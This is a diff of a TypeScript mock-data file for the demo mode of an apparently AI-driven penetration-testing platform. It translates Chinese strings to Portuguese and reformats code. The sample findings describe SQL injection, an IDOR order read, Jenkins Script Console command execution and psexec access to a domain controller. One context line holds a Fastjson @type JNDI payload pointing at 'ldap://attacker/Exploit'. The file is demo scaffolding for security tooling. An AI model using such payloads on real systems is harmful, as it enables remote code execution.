@@ -2,6 +2,8 @@
 // Tudo que não casar retorna um padrão seguro ([] / {} / {ok:true}), garantindo que nenhuma página quebre.
 // Só entra aqui, via curto-circuito do http() de api.ts, quando NEXT_PUBLIC_MOCK=1.
 
+import { isModelReason } from "@/lib/model-reason";
+
 import {
   classifyCompanyScopeLine,
   companyScopeRuleError,
@@ -66,20 +68,30 @@ interface MockBindingSeed {
 // Evidência de tráfego pré-definida por vulnerabilidade (finding id → capturas vinculadas). Escolhe requisições que correspondem à semântica da vulnerabilidade,
 // para que o bloco "tráfego associado" da página de detalhes do demo pareça real.
 const mockFindingTrafficSeeds: Record<string, MockBindingSeed[]> = {
-  "f-1": [{ traffic_id: "x-2", role: "proof", note: "q 参数注入 payload，响应回显 MSSQL 报错。" }],
+  "f-1": [
+    {
+      traffic_id: "x-2",
+      role: "proof",
+      note: "Payload de injeção no parâmetro q; a resposta devolve o erro do MSSQL.",
+    },
+  ],
   "f-2": [
-    { traffic_id: "x-8", role: "baseline", note: "本人订单 id=1001，作为正常对照。" },
-    { traffic_id: "x-9", role: "proof", note: "改 id=1002 越权读到他人订单。" },
+    { traffic_id: "x-8", role: "baseline", note: "Pedido do próprio usuário, id=1001, como referência normal." },
+    { traffic_id: "x-9", role: "proof", note: "Trocando para id=1002, lê indevidamente o pedido de outra pessoa." },
   ],
   "f-12": [
-    { traffic_id: "x-15", role: "proof", note: "Fastjson @type JNDI payload，触发回连。" },
-    { traffic_id: "x-16", role: "verification", note: "二次请求确认命令执行落地。" },
+    { traffic_id: "x-15", role: "proof", note: "Payload JNDI via @type do Fastjson; dispara a conexão de volta." },
+    {
+      traffic_id: "x-16",
+      role: "verification",
+      note: "Segunda requisição confirma que a execução de comando funcionou.",
+    },
   ],
   "f-15": [
-    { traffic_id: "x-17", role: "baseline", note: "Jenkins Script Console 未授权可达。" },
-    { traffic_id: "x-18", role: "proof", note: "scriptText 执行 Groovy 命令返回 SYSTEM。" },
+    { traffic_id: "x-17", role: "baseline", note: "Script Console do Jenkins acessível sem autenticação." },
+    { traffic_id: "x-18", role: "proof", note: "scriptText executa o comando Groovy e devolve SYSTEM." },
   ],
-  "f-17": [{ traffic_id: "x-19", role: "proof", note: "psexec 以 svc_deploy 登录域控 DC01。" }],
+  "f-17": [{ traffic_id: "x-19", role: "proof", note: "psexec entra no controlador de domínio DC01 como svc_deploy." }],
 };
 
 // O demo usa corpos de mensagem fixos, para evitar Request/Response em branco na página de detalhes.
@@ -91,7 +103,7 @@ const mockEvidenceBodies: Record<string, { req: string; resp: string }> = {
   "x-8": { req: "", resp: '{"order_id":1001,"user_id":42,"amount":199.00}' },
   "x-9": {
     req: "",
-    resp: '{"order_id":1002,"user_id":77,"amount":1299.00,"address":"北京市朝阳区 ****","phone":"138****6021"}',
+    resp: '{"order_id":1002,"user_id":77,"amount":1299.00,"address":"Av. Paulista, 1000 — São Paulo ****","phone":"(11) 9****-6021"}',
   },
   "x-15": {
     req: '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker/Exploit","autoCommit":true}',
@@ -178,7 +190,8 @@ function advanceMockRetests() {
     if (Date.now() - Date.parse(retest.created_at) < 15000) continue;
     retest.status = "completed";
     retest.verdict = "inconclusive";
-    retest.summary = "O ambiente de demonstração não executou uma validação real, então não é possível confirmar o estado atual da vulnerabilidade.";
+    retest.summary =
+      "O ambiente de demonstração não executou uma validação real, então não é possível confirmar o estado atual da vulnerabilidade.";
     retest.evidence =
       "### Registro de demonstração\n\nVulnerabilidade original vinculada. Este ambiente não está conectado a um Agent real e não enviou requisições ao alvo; execute o reteste em uma implantação real.";
     retest.finished_at = new Date().toISOString();
@@ -261,7 +274,11 @@ function mockArchiveTask(taskID: string): MockTaskArchive {
   const task = mockTasks.find((item) => item.id === taskID);
   if (!task) throw new Error("Tarefa não existe");
   if (!["paused", "done", "failed", "timeout"].includes(task.status) && !task.paused) {
-    throw new Error(task.queued ? "Tarefas na fila precisam ser pausadas primeiro" : "Tarefas em execução precisam ser pausadas primeiro");
+    throw new Error(
+      task.queued
+        ? "Tarefas na fila precisam ser pausadas primeiro"
+        : "Tarefas em execução precisam ser pausadas primeiro",
+    );
   }
   const existing = mockTaskArchives.find((item) => item.task_id === mockArchiveTaskID(taskID));
   if (existing) throw new Error("A tarefa já está na fila de arquivamento");
@@ -275,7 +292,10 @@ function mockArchiveTask(taskID: string): MockTaskArchive {
           (archive.state === "archive_queued" || archive.state === "archiving"),
       ),
   );
-  if (dependent) throw new Error(`A tarefa é herdada diretamente pela tarefa não arquivada #${dependent.id}, e por ora não pode ser arquivada`);
+  if (dependent)
+    throw new Error(
+      `A tarefa é herdada diretamente pela tarefa não arquivada #${dependent.id}, e por ora não pode ser arquivada`,
+    );
 
   const numericTaskID = mockArchiveTaskID(taskID);
   const assetIDs = mockAssets.filter((asset) => asset.task_ids.includes(numericTaskID)).map((asset) => asset.id);
@@ -358,7 +378,8 @@ function mockArchiveTask(taskID: string): MockTaskArchive {
 }
 
 function mockRestoreArchive(archive: MockTaskArchive): void {
-  if (archive.state !== "ready" && archive.state !== "restore_failed") throw new Error("O estado atual do arquivo não permite restauração");
+  if (archive.state !== "ready" && archive.state !== "restore_failed")
+    throw new Error("O estado atual do arquivo não permite restauração");
   archive.state = "restore_queued";
   archive.phase = "Aguardando restauração";
   archive.progress = 0;
@@ -392,11 +413,15 @@ function mockRestoreArchive(archive: MockTaskArchive): void {
 }
 
 function mockDeleteArchive(archive: MockTaskArchive): void {
-  if (archive.state !== "ready" && archive.state !== "delete_failed") throw new Error("O estado atual do arquivo não permite exclusão permanente");
+  if (archive.state !== "ready" && archive.state !== "delete_failed")
+    throw new Error("O estado atual do arquivo não permite exclusão permanente");
   const dependent = mockTaskArchives.find(
     (candidate) => candidate.id !== archive.id && candidate.source_task_ids.includes(archive.task_id),
   );
-  if (dependent) throw new Error(`O arquivo ainda é dependência da tarefa #${dependent.task_id}, não é possível excluir permanentemente`);
+  if (dependent)
+    throw new Error(
+      `O arquivo ainda é dependência da tarefa #${dependent.task_id}, não é possível excluir permanentemente`,
+    );
   archive.state = "delete_queued";
   archive.phase = "Aguardando exclusão permanente";
   archive.progress = 0;
@@ -1022,7 +1047,12 @@ function route(m: string, path: string, seg: string[], q: URLSearchParams, b: Re
         label: finding.name || finding.vulnclass,
         description: `${finding.severity} · ${finding.summary}`,
       })),
-      ...D.companies.map((company) => ({ kind: "company", id: company.id, label: company.name, description: "Empresa" })),
+      ...D.companies.map((company) => ({
+        kind: "company",
+        id: company.id,
+        label: company.name,
+        description: "Empresa",
+      })),
       ...D.assets.map((asset) => ({
         kind: asset.type,
         id: asset.id,
@@ -1103,7 +1133,8 @@ function route(m: string, path: string, seg: string[], q: URLSearchParams, b: Re
     const ids = bodyIDs(b.archive_ids).map(Number);
     const items = ids.map<ArchiveBatchItem>((id) => {
       const archive = mockTaskArchives.find((item) => item.id === id);
-      if (!archive) return { id: String(id), archive_id: id, ok: false, queued: false, error: "o arquivamento não existe" };
+      if (!archive)
+        return { id: String(id), archive_id: id, ok: false, queued: false, error: "o arquivamento não existe" };
       try {
         mockRestoreArchive(archive);
         return { id: String(id), archive_id: id, ok: true, queued: true };
@@ -1117,7 +1148,8 @@ function route(m: string, path: string, seg: string[], q: URLSearchParams, b: Re
     const ids = bodyIDs(b.archive_ids).map(Number);
     const items = ids.map<ArchiveBatchItem>((id) => {
       const archive = mockTaskArchives.find((item) => item.id === id);
-      if (!archive) return { id: String(id), archive_id: id, ok: false, queued: false, error: "o arquivamento não existe" };
+      if (!archive)
+        return { id: String(id), archive_id: id, ok: false, queued: false, error: "o arquivamento não existe" };
       try {
         mockDeleteArchive(archive);
         return { id: String(id), archive_id: id, ok: true, queued: true };
@@ -1154,7 +1186,9 @@ function route(m: string, path: string, seg: string[], q: URLSearchParams, b: Re
         byID.set(id, { id, ok: false, queued: false, error: (error as Error).message });
       }
     }
-    return { items: requested.map((id) => byID.get(id) ?? { id, ok: false, queued: false, error: "Tarefa não existe" }) };
+    return {
+      items: requested.map((id) => byID.get(id) ?? { id, ok: false, queued: false, error: "Tarefa não existe" }),
+    };
   }
   if (seg[0] === "tasks" && seg[2] === "archive" && seg.length === 3 && m === "POST") {
     return publicMockTaskArchive(mockArchiveTask(seg[1]));
@@ -1655,7 +1689,8 @@ function route(m: string, path: string, seg: string[], q: URLSearchParams, b: Re
       const rules: CompanyScopeRule[] = b.scope.map((candidate, index) => {
         if (typeof candidate === "string") {
           const issue = classifyCompanyScopeLine(candidate, index + 1);
-          if (!issue.rule || issue.error) throw new Error(`Item de escopo ${index + 1} inválido: ${issue.error ?? "não reconhecido"}`);
+          if (!issue.rule || issue.error)
+            throw new Error(`Item de escopo ${index + 1} inválido: ${issue.error ?? "não reconhecido"}`);
           return issue.rule;
         }
         const item = candidate as { kind?: unknown; value?: unknown };
@@ -1735,7 +1770,8 @@ function route(m: string, path: string, seg: string[], q: URLSearchParams, b: Re
     }
     const ids = [...new Set(Array.isArray(b.asset_ids) ? b.asset_ids.map(Number) : [])];
     const sourceSummary = String(b.source_summary ?? "").trim();
-    if (ids.length === 0 || ids.length > 100 || !sourceSummary) throw new Error("Selecione os ativos e preencha a descrição da origem");
+    if (ids.length === 0 || ids.length > 100 || !sourceSummary)
+      throw new Error("Selecione os ativos e preencha a descrição da origem");
     const requestedAssets = ids.map((id) => mockAssets.find((asset) => asset.id === id));
     if (requestedAssets.some((asset) => !asset)) throw new Error("O ativo não existe");
     const mutation: TaskAssetMutation = { requested: ids.length, attached: 0, existing: 0 };
@@ -1767,11 +1803,26 @@ function route(m: string, path: string, seg: string[], q: URLSearchParams, b: Re
     let mappings: Array<{ intentID: string; assetID: number; summary: string }> = [];
     if (seg[1] === "t-acme-web") {
       mappings = [
-        { intentID: "i3", assetID: 6, summary: "后台功能枚举意图从前序子域发现中选定" },
-        { intentID: "i5", assetID: 3, summary: "订单接口测试意图从 API 任务目标中选定" },
+        {
+          intentID: "i3",
+          assetID: 6,
+          summary:
+            "A intenção de enumerar as funções do painel foi escolhida a partir da descoberta de subdomínios anterior",
+        },
+        {
+          intentID: "i5",
+          assetID: 3,
+          summary: "A intenção de testar o endpoint de pedidos foi escolhida a partir do objetivo da tarefa de API",
+        },
       ];
     } else if (seg[1] === "t-acme-api") {
-      mappings = [{ intentID: "i5", assetID: 3, summary: "订单接口测试意图从 API 任务目标中选定" }];
+      mappings = [
+        {
+          intentID: "i5",
+          assetID: 3,
+          summary: "A intenção de testar o endpoint de pedidos foi escolhida a partir do objetivo da tarefa de API",
+        },
+      ];
     }
     const sourceTaskID = mockTaskAssetID(seg[1]) ?? 0;
     const assets: IntentAsset[] = mappings.flatMap((mapping) => {
@@ -1820,7 +1871,8 @@ function route(m: string, path: string, seg: string[], q: URLSearchParams, b: Re
     if (!company) throw new Error("A empresa não existe");
     const reset = b.reset === true;
     const scopeResult = mockScopeRows(company.id, b.scope, reset ? [] : (company.scope ?? []));
-    if (reset && scopeResult.invalid > 0) throw new Error("O escopo da empresa contém regras inválidas, o escopo original não foi sobrescrito");
+    if (reset && scopeResult.invalid > 0)
+      throw new Error("O escopo da empresa contém regras inválidas, o escopo original não foi sobrescrito");
     company.scope = reset ? scopeResult.rows : [...(company.scope ?? []), ...scopeResult.rows];
     return { added: scopeResult.rows.length, skipped: scopeResult.skipped, invalid: scopeResult.invalid };
   }
@@ -2223,7 +2275,11 @@ function route(m: string, path: string, seg: string[], q: URLSearchParams, b: Re
   if (path === "/settings/web-search/test") return { ok: true, count: 5, backend: D.settings.web_search_backend };
   if (path === "/settings/python/detect") return { python_interpreter: "/usr/bin/python3" };
   if (path === "/chat")
-    return { reply: "(demo) Injetei essa sugestão como uma intenção de alta prioridade, e o work agent a executará o quanto antes.", mode: "hint" };
+    return {
+      reply:
+        "(demo) Injetei essa sugestão como uma intenção de alta prioridade, e o work agent a executará o quanto antes.",
+      mode: "hint",
+    };
   if (path === "/gc") return { removed: 0 };
 
   // ── Histórico de execução de ferramentas ──
@@ -2369,7 +2425,8 @@ function route(m: string, path: string, seg: string[], q: URLSearchParams, b: Re
   // ── tools ──
   if (path === "/tools" && m === "GET") return { tools: D.tools };
   if (path === "/tools/custom" && m === "POST") return { key: String(b.key ?? "custom-tool") };
-  if (path === "/tools/custom/test") return { output: "(demo) Exemplo de saída de execução de ferramenta.", is_error: false };
+  if (path === "/tools/custom/test")
+    return { output: "(demo) Exemplo de saída de execução de ferramenta.", is_error: false };
 
   // ── mcp ──
   if (path === "/mcp" && m === "GET") return { servers: D.mcpServers };
@@ -2392,7 +2449,10 @@ function route(m: string, path: string, seg: string[], q: URLSearchParams, b: Re
   if (path === "/skills" && m === "POST") return { name: String(b.name ?? "new-skill") };
   if (seg[0] === "skills" && seg[2] === "files" && seg.length === 3) return { files: ["SKILL.md"] };
   if (seg[0] === "skills" && seg[2] === "files" && seg.length >= 4)
-    return { content: "# SKILL.md\n\n(demo) Este é um exemplo do arquivo de descrição desta skill.", file: seg.slice(3).join("/") };
+    return {
+      content: "# SKILL.md\n\n(demo) Este é um exemplo do arquivo de descrição desta skill.",
+      file: seg.slice(3).join("/"),
+    };
 
   // ── visibility ──
   if (seg[0] === "visibility" && m === "GET") return { agents: [] };
@@ -2413,7 +2473,8 @@ function route(m: string, path: string, seg: string[], q: URLSearchParams, b: Re
     const detail = mockInterceptDetails[id];
     if (detail) {
       detail.effective_action = b.decision === "allowed" ? "allow" : "deny";
-      detail.decision_reason = b.decision === "allowed" ? "Execução permitida manualmente" : "Execução negada manualmente";
+      detail.decision_reason =
+        b.decision === "allowed" ? "Execução permitida manualmente" : "Execução negada manualmente";
       detail.execution_status = b.decision === "allowed" ? "unknown" : "not_executed";
       detail.output = b.decision === "allowed" ? "O modo de demonstração não executou a ferramenta." : "";
     }
@@ -2429,11 +2490,12 @@ function route(m: string, path: string, seg: string[], q: URLSearchParams, b: Re
   if (path === "/intercept/history" || (seg[0] === "intercept" && seg[1] === "task")) {
     const status = q.get("status") || "";
     const decisionSource = q.get("decision_source") || "";
-    if (status && !["pending", "allowed", "denied", "timeout"].includes(status)) throw new Error("Status de aprovação inválido");
-    if (decisionSource && !["model", "rule", "unknown"].includes(decisionSource)) throw new Error("Origem de decisão inválida");
+    if (status && !["pending", "allowed", "denied", "timeout"].includes(status))
+      throw new Error("Status de aprovação inválido");
+    if (decisionSource && !["model", "rule", "unknown"].includes(decisionSource))
+      throw new Error("Origem de decisão inválida");
     const filtered = mockInterceptHistory.filter((row) => {
-      const source =
-        row.decision_source || (row.rule_id ? "rule" : row.reason?.startsWith("[模型]") ? "model" : "unknown");
+      const source = row.decision_source || (row.rule_id ? "rule" : isModelReason(row.reason) ? "model" : "unknown");
       return (
         (seg[1] !== "task" || row.task_id === decodeURIComponent(seg[2])) &&
         (!status || row.status === status) &&
